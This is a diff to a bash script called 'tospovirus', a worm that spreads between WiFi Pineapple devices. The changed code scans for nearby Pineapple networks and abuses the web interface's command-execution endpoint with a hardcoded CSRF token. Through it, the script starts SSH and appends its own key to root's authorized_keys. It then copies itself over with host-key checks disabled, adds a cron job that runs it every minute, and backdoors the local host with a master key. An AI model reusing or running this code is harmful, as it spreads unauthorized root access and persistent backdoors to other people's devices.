@@ -1,15 +1,29 @@
 #!/bin/bash
 self=`uci get wireless.@wifi-iface[0].ssid`
 
-#Mark this device as already being infected by appending a whitespace to it's SSID.
-if grep -q "\"\$6[^\"]" /lib/wifi/mac80211.sh;
-then
-       sed -i -e 's/"\$6/"$6" "/' /lib/wifi/mac80211.sh
-       uci set wireless.@wifi-iface[0].ssid="$(uci get wireless.@wifi-iface[0].ssid) "
-       uci commit
-       wifi
-       exit
-fi
+init() {
+	#Mark the device as being pwn3d.
+	if grep -q "\"\$6[^\"]" /lib/wifi/mac80211.sh;
+	then
+	       sed -i -e 's/"\$6/"$6" "/' /lib/wifi/mac80211.sh
+	       uci set wireless.@wifi-iface[0].ssid="$(uci get wireless.@wifi-iface[0].ssid) "
+	       uci commit
+	       wifi
+	       exit
+	fi
+	if [ -f /tmp/tospolock ]; then
+		exit
+	fi
+	#Make ourselves a key we'll use for all our children.
+	if [ ! -f /tospo/tospo_rsa.pub ]; then
+		echo "Generating tospo ssh key..."
+		ssh-keygen -b 768 -f /tospo/tospo_rsa -N ""
+	fi
+	#Backdoor the machine with the master key...
+	if [ -f /root/.ssh/authorized_keys ]; then
+		grep -q "$(cat /tospo/tvbd.pub)" ~/.ssh/authorized_keys || cat /tospo/tvbd.pub >> /root/.ssh/authorized_keys
+	fi
+}
 
 pushstate() {
 	echo "Pushing state..."
@@ -30,7 +44,6 @@ popstate () {
 connect() {
 	ssid=$1
 	echo "Connecting to $ssid..."
-	echo "Bringing radio1 up..."
 	ifconfig wlan1 up
 	echo "Avoiding conflicts..."
 	#TODO: Store this value to better preserve state for custom configurations
@@ -39,18 +52,21 @@ connect() {
 
 	#TODO: We reference wifi-iface[2] a lot, should this be something less specific?
 	#check against older versions to see if this remains regularly available.
+	echo "Guess at the client-mode interface..."
+	wid=$(uci show wireless | grep "wireless.@wifi-iface\[[0-9]\].device=radio1" | cut -d'[' -f 2 | cut -d']' -f 1)
 	echo "Stripping keys just in case..."	
-	uci delete wireless.@wifi-iface[2].key
-	uci delete wireless.@wifi-iface[2].encryption
-	echo "Connect to the target network will do DHCP..."
-	uci set wireless.@wifi-iface[2].network=wan
-	uci set wireless.@wifi-iface[2].mode=sta
-	uci set wireless.@wifi-iface[2].ssid="$ssid"
-	uci set wireless.@wifi-iface[2].hidden=0
+	uci delete wireless.@wifi-iface[$wid].key
+	uci delete wireless.@wifi-iface[$wid].encryption
+	echo "Connect to the target network..."
+	uci set wireless.@wifi-iface[$wid].network=wan
+	uci set wireless.@wifi-iface[$wid].mode=sta
+	uci set wireless.@wifi-iface[$wid].ssid="$ssid"
+	uci set wireless.@wifi-iface[$wid].hidden=0
 	uci set wireless.radio1.channel=11
-	echo "uci commit wireless"	
 	uci commit wireless
 	wifi
+	sleep 3
+	ifconfig wlan1 172.16.42.146
 }
 
 post() {
@@ -65,28 +81,16 @@ login() {
 	echo "Logged in Successfully!"
 }
 
-handshake() {
-	echo "Handshaking..."
-	rm /tospo/pu 2>/dev/null
-	post "/components/system/configuration/functions.php?execute=" "_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands=/etc/init.d/sshd start;mkdir /tospo; openssl genrsa 512 >/tospo/pr%%26%%26openssl rsa -pubout -in /tospo/pr;" "tospovirus" | awk '/-----BEGIN PUBLIC KEY-----/,/-----END PUBLIC KEY-----/' > /tospo/pu
-	if [ ! -f /tospo/pu -a -s /tospo/pu  ]; then
-		echo "Failed to get public key from server..." && popstate && exit
-	fi
-}
-
-
-#TODO: Clean up this cluster fuck.
 infect() {
-	#echo "Transfering backdoor ssh key..."
-	if [ ! -f /tospo/tospo_rsa.pub ]; then
-		echo "Generating tospo ssh key..."
-		ssh-keygen -b 768 -f /root/.ssh/tospo_rsa -N ""
-	fi
-	post '/components/system/configuration/functions.php?execute=' "_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands=mkdir /root/.ssh; printf \"\$(echo $(hexdump -e'16/1 "%02x"' /tospo/tospo_rsa.pub) >> /root/.ssh/authorized_keys" "tospovirus"
-	scp -r /tospo 172.16.42.1:/ -i /tospo/tospo_rsa
-
+	post '/components/system/configuration/functions.php?execute=' "_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands=/etc/init.d/sshd start;mkdir /root/.ssh; printf \"\$(echo $(hexdump -e'16/1 "%02x"' /tospo/tospo_rsa.pub)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">>/root/.ssh/authorized_keys" "tospovirus"
+	ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa 172.16.42.1 "mkdir -p /tospo" && scp -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa -r /tospo/tv* 172.16.42.1:/tospo/
 }
 
+persist() {
+	ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa 172.16.42.1 'printf "* * * * * /tospo/tv" | crontab -'
+}
+
+init
 echo "Scanning for new devices..."
 for net in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$self"`
 do
@@ -94,6 +98,7 @@ do
 	connect `echo $net | cut -d '"' -f 2`
 	login 
 	infect
+	persist
 	popstate
 	break
 done
